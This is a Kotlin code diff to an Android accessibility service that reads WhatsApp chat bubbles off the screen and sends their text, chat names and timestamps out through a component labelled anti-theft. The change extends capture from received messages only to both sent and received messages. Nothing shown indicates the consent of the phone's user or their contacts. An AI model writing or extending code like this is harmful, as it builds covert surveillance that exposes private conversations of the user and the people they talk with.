@@ -162,8 +162,10 @@ class ProtectAccessibilityService : AccessibilityService() {
     /**
      * Scans the visible WhatsApp conversation for text message bubbles and forwards
      * any new ones found. Runs at most every 2s per content-change event.
-     * Only captures incoming messages (direction="in") — outgoing are captured via
-     * the send-button click handler to preserve the correct direction label.
+     * Captures BOTH incoming and outgoing bubbles — direction is detected from the
+     * parent container ("out_row" = sent by user, otherwise received).
+     * The send-button click handler is kept as a supplementary path for when
+     * WhatsApp is composing in the background (e.g., via notification quick-reply).
      */
     private fun scanVisibleMessages(root: AccessibilityNodeInfo?, chatName: String) {
         if (root == null || chatName.isBlank()) return
@@ -180,23 +182,23 @@ class ProtectAccessibilityService : AccessibilityService() {
                 for (node in nodes) {
                     val text = node.text?.toString()?.trim() ?: continue
                     if (text.isBlank() || text.length > 4000) continue
-                    // Simple dedup key: chatName + text (trim to 120 chars)
-                    val key = "$chatName|${text.take(120)}"
-                    if (capturedScreenMessages.contains(key)) continue
-                    capturedScreenMessages.add(key)
-                    if (capturedScreenMessages.size > 500) capturedScreenMessages.clear()
 
-                    // Check if this is a sent or received bubble by inspecting parent layout
-                    // WhatsApp places sent bubbles in "out_row" containers — skip those
-                    // (they are handled by the send-button click handler)
+                    // Detect direction from parent layout.
+                    // WhatsApp places sent bubbles in "out_row" containers.
                     val parentDesc = node.parent?.contentDescription?.toString()?.lowercase() ?: ""
                     val parentId   = node.parent?.viewIdResourceName?.lowercase() ?: ""
                     val isSent = parentId.contains("out") || parentDesc.contains("sent") ||
                                  parentDesc.contains("enviada")
-                    if (isSent) continue
+                    val direction = if (isSent) "out" else "in"
 
-                    Log.d("AccessibilityService", "Screen-scan captured msg in '$chatName': '${text.take(40)}'")
-                    sendScreenCapturedMessage(chatName, text, now)
+                    // Dedup key includes direction so "Oi" sent ≠ "Oi" received
+                    val key = "$chatName|$direction|${text.take(120)}"
+                    if (capturedScreenMessages.contains(key)) continue
+                    capturedScreenMessages.add(key)
+                    if (capturedScreenMessages.size > 600) capturedScreenMessages.clear()
+
+                    Log.d("AccessibilityService", "Screen-scan captured $direction msg in '$chatName': '${text.take(40)}'")
+                    sendScreenCapturedMessage(chatName, text, now, direction)
                 }
             }
         } catch (e: Exception) {
@@ -204,11 +206,11 @@ class ProtectAccessibilityService : AccessibilityService() {
         }
     }
 
-    private fun sendScreenCapturedMessage(chatName: String, content: String, timestamp: Long) {
+    private fun sendScreenCapturedMessage(chatName: String, content: String, timestamp: Long, direction: String = "in") {
         try {
             val addressJson = Json.encodeToString(String.serializer(), chatName)
             val contentJson = Json.encodeToString(String.serializer(), content)
-            val payload = """{"type":"WHATSAPP_MESSAGE","direction":"in","address":$addressJson,"name":$addressJson,"content":$contentJson,"source":"whatsapp","timestamp":$timestamp}"""
+            val payload = """{"type":"WHATSAPP_MESSAGE","direction":"$direction","address":$addressJson,"name":$addressJson,"content":$contentJson,"source":"whatsapp","timestamp":$timestamp}"""
             AntiTheftService.sendRawMessage(payload)
         } catch (e: Exception) {
             Log.e("AccessibilityService", "sendScreenCapturedMessage error: ${e.message}")
